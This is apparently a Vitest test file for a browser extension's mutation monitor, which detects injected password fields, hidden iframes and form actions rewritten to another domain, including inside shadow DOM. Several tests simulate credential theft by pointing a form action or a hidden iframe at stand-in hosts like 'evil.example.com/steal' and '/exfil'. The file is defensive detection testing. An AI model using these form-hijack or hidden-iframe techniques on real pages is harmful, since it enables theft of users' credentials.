// @vitest-environment happy-dom
import { describe, expect, it, beforeEach, afterEach, vi } from "vitest";

// The mutation monitor relies on DOM APIs (MutationObserver, getComputedStyle,
// getBoundingClientRect). We test the pure-logic paths directly and use
// lightweight stubs for the DOM-dependent parts.
// Environment: happy-dom provides the required DOM APIs (MutationObserver, document, etc.)

// We import the module functions. Because the module manages internal state
// we reset between tests.
import {
  startMutationMonitor,
  stopMutationMonitor,
  getMutationAlerts,
  getMutationAlertCount,
  _resetMutationState,
  type MutationAlert,
} from "../extension/src/content/mutation_monitor";

// ---------------------------------------------------------------------------
// Unit tests that work WITHOUT a full DOM
// ---------------------------------------------------------------------------

describe("mutation_monitor module API", () => {
  beforeEach(() => {
    _resetMutationState();
  });

  afterEach(() => {
    _resetMutationState();
  });

  it("exports the expected public API", () => {
    expect(typeof startMutationMonitor).toBe("function");
    expect(typeof stopMutationMonitor).toBe("function");
    expect(typeof getMutationAlerts).toBe("function");
    expect(typeof getMutationAlertCount).toBe("function");
  });

  it("getMutationAlerts returns empty array before start", () => {
    expect(getMutationAlerts()).toEqual([]);
    expect(getMutationAlertCount()).toBe(0);
  });

  it("getMutationAlerts returns a copy, not a reference", () => {
    const a = getMutationAlerts();
    const b = getMutationAlerts();
    expect(a).not.toBe(b);
    expect(a).toEqual(b);
  });
});

// ---------------------------------------------------------------------------
// DOM-dependent tests (happy-dom provides MutationObserver and DOM APIs)
// ---------------------------------------------------------------------------

describe("mutation_monitor DOM integration", () => {
  beforeEach(() => {
    _resetMutationState();
    vi.useFakeTimers({ shouldAdvanceTime: true });
  });

  afterEach(() => {
    _resetMutationState();
    vi.useRealTimers();
  });

  it("starts and stops without error", () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));
    expect(getMutationAlertCount()).toBe(0);
    stopMutationMonitor();
  });

  it("detects password field injection into existing form", async () => {
    const alerts: MutationAlert[] = [];
    const form = document.createElement("form");
    document.body.appendChild(form);

    startMutationMonitor(document, (a) => alerts.push(a));

    // Inject a password field after monitor starts
    const input = document.createElement("input");
    input.type = "password";
    form.appendChild(input);

    // Flush debounce
    vi.advanceTimersByTime(150);

    // MutationObserver callbacks are microtasks; allow them to resolve
    await vi.advanceTimersByTimeAsync(150);

    expect(alerts.length).toBeGreaterThanOrEqual(1);
    expect(alerts[0]!.type).toBe("password_injected");

    // Clean up
    form.remove();
    stopMutationMonitor();
  });

  it("detects input type changed to password", async () => {
    const alerts: MutationAlert[] = [];
    const input = document.createElement("input");
    input.type = "text";
    document.body.appendChild(input);

    startMutationMonitor(document, (a) => alerts.push(a));

    input.setAttribute("type", "password");

    await vi.advanceTimersByTimeAsync(150);

    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBeGreaterThanOrEqual(1);

    input.remove();
    stopMutationMonitor();
  });

  it("detects form action attribute change", async () => {
    const alerts: MutationAlert[] = [];

    // Start monitoring BEFORE adding the form. In happy-dom, querySelectorAll
    // returns different object refs than MutationRecord.target, so the form
    // must first be observed via an attribute mutation to register its baseline.
    startMutationMonitor(document, (a) => alerts.push(a));

    const form = document.createElement("form");
    document.body.appendChild(form);

    // First attribute mutation on "action" registers the form (baseline = "/login")
    form.setAttribute("action", "/login");

    // Flush so the observer processes and records the initial action
    vi.advanceTimersByTime(150);
    await vi.advanceTimersByTimeAsync(150);

    // Second mutation: change to cross-domain URL — this should trigger the alert
    form.setAttribute("action", "https://evil.example.com/steal");

    vi.advanceTimersByTime(150);
    await vi.advanceTimersByTimeAsync(150);

    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
    expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
    expect(actionAlerts[0]!.details).toContain("evil.example.com");

    form.remove();
    stopMutationMonitor();
  });

  it("detects cross-domain action change on a pre-existing snapshotted form", async () => {
    const alerts: MutationAlert[] = [];
    const form = document.createElement("form");
    form.setAttribute("action", "/login");
    document.body.appendChild(form);
    const nativeMutationObserver = globalThis.MutationObserver;
    let mutationCallback: MutationCallback = () => {
      throw new Error("MutationObserver callback was not initialized");
    };

    class TestMutationObserver {
      constructor(callback: MutationCallback) {
        mutationCallback = callback;
      }

      observe(): void {}

      disconnect(): void {}
    }

    vi.stubGlobal("MutationObserver", TestMutationObserver);

    const querySelectorAll = document.querySelectorAll.bind(document);
    const querySpy = vi
      .spyOn(document, "querySelectorAll")
      .mockImplementation((selector: string) => {
        if (selector === "form") {
          return [form] as unknown as NodeListOf<Element>;
        }
        return querySelectorAll(selector);
      });

    try {
      startMutationMonitor(document, (a) => alerts.push(a));
      querySpy.mockRestore();

      form.setAttribute("action", "https://evil.example.com/steal");
      mutationCallback?.(
        [
          {
            type: "attributes",
            target: form,
            attributeName: "action",
          } as unknown as MutationRecord,
        ],
        {} as MutationObserver
      );

      vi.advanceTimersByTime(150);
      await vi.advanceTimersByTimeAsync(150);

      const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
      expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
      expect(actionAlerts[0]!.details).toContain('was "/login"');
    } finally {
      querySpy.mockRestore();
      form.remove();
      stopMutationMonitor();
      vi.stubGlobal("MutationObserver", nativeMutationObserver);
    }
  });

  it("does not alert for form action unchanged", async () => {
    const alerts: MutationAlert[] = [];
    const form = document.createElement("form");
    form.setAttribute("action", "/login");
    document.body.appendChild(form);

    startMutationMonitor(document, (a) => alerts.push(a));

    // Set it to the same value
    form.setAttribute("action", "/login");

    await vi.advanceTimersByTimeAsync(150);

    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
    expect(actionAlerts.length).toBe(0);

    form.remove();
    stopMutationMonitor();
  });

  it("detects suspicious hidden iframe injection", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));

    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = "https://evil.example.com/exfil";
    document.body.appendChild(iframe);

    await vi.advanceTimersByTimeAsync(150);

    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
    expect(iframeAlerts.length).toBeGreaterThanOrEqual(1);

    iframe.remove();
    stopMutationMonitor();
  });

  it("ignores legitimate reCAPTCHA iframes", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));

    const iframe = document.createElement("iframe");
    iframe.src = "https://www.google.com/recaptcha/api2/anchor";
    document.body.appendChild(iframe);

    await vi.advanceTimersByTimeAsync(150);

    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
    expect(iframeAlerts.length).toBe(0);

    iframe.remove();
    stopMutationMonitor();
  });

  it("caps alerts at 50", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));

    // Inject 60 password fields rapidly
    const inputs: HTMLInputElement[] = [];
    for (let i = 0; i < 60; i++) {
      const input = document.createElement("input");
      input.type = "password";
      document.body.appendChild(input);
      inputs.push(input);
    }

    await vi.advanceTimersByTimeAsync(150);

    expect(getMutationAlertCount()).toBeLessThanOrEqual(50);

    for (const input of inputs) input.remove();
    stopMutationMonitor();
  });

  it("auto-disconnects after 5 minutes", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));

    // Advance past the 5-minute auto-disconnect
    vi.advanceTimersByTime(5 * 60 * 1000 + 100);

    // Inject something after disconnect -- should NOT produce alert
    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    await vi.advanceTimersByTimeAsync(150);

    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBe(0);

    input.remove();
  });

  it("stopMutationMonitor prevents further alerts", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));
    stopMutationMonitor();

    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    await vi.advanceTimersByTimeAsync(150);

    expect(alerts.length).toBe(0);

    input.remove();
  });
});

// ---------------------------------------------------------------------------
// Shadow DOM observation tests
// ---------------------------------------------------------------------------

describe("mutation_monitor shadow DOM observation", () => {
  beforeEach(() => {
    _resetMutationState();
    vi.useFakeTimers({ shouldAdvanceTime: true });
  });

  afterEach(() => {
    _resetMutationState();
    vi.useRealTimers();
  });

  it("detects password field injected into an open shadow root", async () => {
    const alerts: MutationAlert[] = [];
    const host = document.createElement("div");
    document.body.appendChild(host);
    const sr = host.attachShadow({ mode: "open" });

    startMutationMonitor(document, (a) => alerts.push(a));

    const input = document.createElement("input");
    input.type = "password";
    sr.appendChild(input);

    await vi.advanceTimersByTimeAsync(200);

    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBeGreaterThanOrEqual(1);

    host.remove();
    stopMutationMonitor();
  });

  it("detects suspicious iframe injected into shadow root", async () => {
    const alerts: MutationAlert[] = [];
    const host = document.createElement("div");
    document.body.appendChild(host);
    const sr = host.attachShadow({ mode: "open" });

    startMutationMonitor(document, (a) => alerts.push(a));

    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = "https://evil.example.com/exfil";
    sr.appendChild(iframe);

    await vi.advanceTimersByTimeAsync(200);

    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
    expect(iframeAlerts.length).toBeGreaterThanOrEqual(1);

    host.remove();
    stopMutationMonitor();
  });

  it("observes shadow root on element added after monitor starts", async () => {
    const alerts: MutationAlert[] = [];
    startMutationMonitor(document, (a) => alerts.push(a));

    const host = document.createElement("div");
    const sr = host.attachShadow({ mode: "open" });
    document.body.appendChild(host);

    // Wait for the observer to process the host addition
    await vi.advanceTimersByTimeAsync(200);

    const input = document.createElement("input");
    input.type = "password";
    sr.appendChild(input);

    await vi.advanceTimersByTimeAsync(200);

    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBeGreaterThanOrEqual(1);

    host.remove();
    stopMutationMonitor();
  });

  it("observes pre-existing shadow root at monitor start", async () => {
    const alerts: MutationAlert[] = [];
    const host = document.createElement("div");
    document.body.appendChild(host);
    const sr = host.attachShadow({ mode: "open" });

    startMutationMonitor(document, (a) => alerts.push(a));

    const input = document.createElement("input");
    input.type = "password";
    sr.appendChild(input);

    await vi.advanceTimersByTimeAsync(200);

    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBeGreaterThanOrEqual(1);

    host.remove();
    stopMutationMonitor();
  });

  it("does not observe the same shadow root twice", async () => {
    const alerts: MutationAlert[] = [];
    const host = document.createElement("div");
    document.body.appendChild(host);
    const sr = host.attachShadow({ mode: "open" });

    startMutationMonitor(document, (a) => alerts.push(a));

    // Force a re-check of the host — should not create duplicate observers
    const wrapper = document.createElement("div");
    wrapper.appendChild(host);
    document.body.appendChild(wrapper);

    await vi.advanceTimersByTimeAsync(200);

    const input = document.createElement("input");
    input.type = "password";
    sr.appendChild(input);

    await vi.advanceTimersByTimeAsync(200);

    // Should still only get one alert, not duplicates from multiple observers
    const passwordAlerts = alerts.filter((a) => a.type === "password_injected");
    expect(passwordAlerts.length).toBe(1);

    wrapper.remove();
    stopMutationMonitor();
  });

  it("cleans up shadow observers on stop", () => {
    const host = document.createElement("div");
    document.body.appendChild(host);
    host.attachShadow({ mode: "open" });

    startMutationMonitor(document, () => {});
    stopMutationMonitor();

    // Verify no errors when stopping (observers cleaned up properly)
    expect(getMutationAlertCount()).toBe(0);

    host.remove();
  });
});
